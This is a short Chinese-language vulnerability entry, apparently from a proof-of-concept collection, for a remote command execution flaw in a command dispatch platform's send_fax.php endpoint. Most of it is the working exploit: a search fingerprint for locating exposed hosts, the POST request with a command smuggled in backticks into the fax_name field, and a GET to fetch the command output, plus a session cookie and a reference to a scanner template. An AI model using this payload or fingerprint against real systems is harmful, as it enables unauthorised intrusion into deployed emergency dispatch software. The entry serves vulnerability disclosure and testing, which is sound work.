# 指挥调度平台send_fax存在远程命令执行漏洞

- **系统**：指挥调度平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /api/client/fax/send_fax.php HTTP/1.1`
- **关键头**：`Content-Length: 29`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
fax_name=`whoami > 1.txt`.pdf

获取命令执行结果
GET /api/client/fax/1.txt HTTP/1.1
Host:
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2

\[福建科立讯通信-指挥调度平台-send-fax-远程命令执行.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 指挥调度平台send\_fax存在远程命令执行漏洞: * 一、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***